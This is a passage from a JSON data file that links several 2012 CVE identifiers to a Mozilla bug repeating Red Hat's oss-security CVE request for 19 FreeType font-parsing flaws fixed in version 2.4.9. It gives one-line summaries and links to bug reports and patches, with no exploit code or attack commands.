        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1131": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1132": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 Issue #2: ========= freetype: Out-of heap-based buffer read by parsing glyph information and bitmaps for BDF fonts (FU#35599, FU#35600) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35599 [2] https://savannah.nongnu.org/bugs/?35600 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0b1c0c6b20bf121096afff206d570f26183402b3 Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800583 Issue #3: ========= freetype: NULL pointer dereference by moving zone2 pointer point for certain TrueType font (FU#35601) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35601 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=96cddb8d1d32d6738b06552083db9d6cee5b5cb4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800584 Issue #4: ========= freetype: Out-of heap-based buffer read when parsing certain SFNT strings by Type42 font parser (FU#35602) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35602 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=82365c0dead99dd119d9e7117cf4f36ce1d1cbe1 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800585 Issue #5: ========= freetype: Out-of heap-based buffer read by loading properties of PCF fonts (FU#35603) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35603 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=c776fc17bfeaa607405fc96620e9445e7a0965c3 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800587 Issue #6: ========= freetype (64-bit specific): Out-of heap-based buffer read by attempt to record current cell into the cell table (FU#35604) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35604 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=fcbc82e69e7b114b0db75e955896107d611898e6 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800589 Issue #7: ========= freetype: Out-of heap-based buffer read flaw in Type1 font loader by parsing font dictionary entries (FU#35606) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35606 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=58cbc465d2ccd904dee755cff791fbb3a866646d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800590 Issue #8: ========= freetype: Out-of heap-based buffer write by parsing BDF glyph information and bitmaps (FU#35607) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35607 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=28dd2c45957278e962f95633157b6139de8170aa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800591 Issue #9: ========= freetype: Out-of heap-based buffer write in Type1 font parser by retrieving font's private dictionary (FU#35608) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35608 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9577add645c8c05460c7d60ad486c021394b82e Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800592 Issue #10: ========== freetype: Out-of heap-based buffer read in TrueType bytecode interpreter by executing NPUSHB and NPUSHW instructions (FU#35640) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35640 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=5dddcc45a03b336860436a180aec5b358517336b Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800593 Issue #11: ========== freetype: Out-of heap-based buffer write by parsing BDF glyph and bitmaps information with missing ENCODING field (FU#35641) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35641 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=4086fb7caf41e33137e548e43a49a97b127cd369 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800594 Issue #12: ========== freetype: Out-of heap-based buffer read by parsing BDF font header (FU#35643) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35643 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=cee5d593582801f65c5e127d9de9ca24ebcdc747 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800595 Issue #13: ========== freetype: Out-of heap-based buffer read in the TrueType bytecode interpreter by executing the MIRP instruction (FU#35646) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35646 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=a33c013fe2dc6e65de2879682201d9c155292349 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800597 Issue #14: ========== freetype: Array index error, leading to out-of stack based buffer read by parsing BDF font glyph information (FU#35656) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35656 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=6ac022dc750d95296a6f731b9594f2e751d997fa Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800598 Issue #15: ========== freetype: Out-of heap-based buffer read by conversion of PostScript font objects (FU#35657) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35657 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=292144b44a15c1a72f2ef76475d65b7a3a3fba67 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800600 Issue #16: ========== freetype: Out-of heap-based buffer read flaw by conversion of an ASCII string into a signed short integer by processing BDF fonts (FU#35658) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35658 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=d9c1659610f9cd5e103790cb5963483d65cf0d2d Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800602 Issue #17: ========== freetype: Out-of heap-based buffer write by retrieval of advance values for glyph outlines (FU#35659) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35659 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=7d35a7dc7cc621538a1f4a63c83ebf223aace0b0 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800604 Issue #18: ========== freetype: Integer divide by zero by performing arithmetic computations for certain fonts (FU#35660) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35660 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=ba67957d5ead443f4b6b31805d6e780d54361ca4 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800606 Issue #19: ========== freetype: Out-of heap-based buffer write in the TrueType bytecode interpreter by moving zone2 pointer point (FU#35689) Upstream bug report: [1] https://savannah.nongnu.org/bugs/?35689 Upstream patch: [2] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=0fc8debeb6c2f6a8a9a2b97332a7c8a0a1bd9e85 Red Hat Bugzilla entry: [3] https://bugzilla.redhat.com/show_bug.cgi?id=800607"
      }
    ],
    "CVE-2012-1133": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=733512",
        "title": "FreeType: Multiple security flaws to be fixed in v2.4.9",
        "description": "We received a forward of this FreeType security issue. Per Dveditz, this is still used in Mobile Firefox. We should take the FreeType update to 2.4.9 since it looks like we still use 2.4.3 on Central (see http://mxr.mozilla.org/mozilla-central/source/modules/freetype2/ChangeLog). Date: Tue, 06 Mar 2012 20:57:12 +0100 From: Jan Lieskovsky <jlieskov@redhat.com> Subject: [oss-security] CVE Request -- FreeType: Multiple security flaws to be fixed in v2.4.9 Hello Kurt, Steve, vendors, we have been notified by Mateusz Jurczyk of the Google Security Team, about the following FreeType security flaws, which are going to be fixed in v2.4.9 version. Credit: Mateusz Jurczyk, Google Security Team Note: Though some the issues below might look like related / the same, I have checked that each of them exclude themselves (IOW each of them is different issue like the another. But was lazy to cross-reference those, which of them is different from which another. Reproducers are attached to relevant upstream bug reports. Have Cc-ed Werner Lemberg of FreeType upstream on this post too, so he could collect CVE identifiers prior FreeType v2.4.9 release. Yet, requesting CVE identifier even for the NULL ptr dereference and floating point exception / integer divide by zero issue below, even if Red Hat would not consider these to be security flaws. But other distributions might be doing so, thus will let Steve to decide, if these two desire CVE identifiers or not. And finally, due the count of the issues, not including full issues description under each entry (to shorten the request). Only particular Red Hat Bugzilla entry summary is included with relevant links to upstream bugs and commits. Further issue description can be found under particular Red Hat Bugzilla entry for each of them in initial comment (#c0). Kurt, Steve, could you allocate CVE identifiers for these? Thank you && Regards, Jan. -- Jan iankko Lieskovsky / Red Hat Security Response Team Issue #1: ========= freetype: Out-of heap-based buffer read by parsing, adding properties in BDF fonts, or validating if property being an atom (FU#35597, FU#35598) Upstream bug reports: [1] https://savannah.nongnu.org/bugs/?35597 [2] https://savannah.nongnu.org/bugs/?35598 Upstream patch: [3] http://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=320d4976d1d010b5abe9d61a7423d8ca06bc34df Red Hat Bugzilla entry: [4] https://bugzilla.redhat.com/show_bug.cgi?id=800581 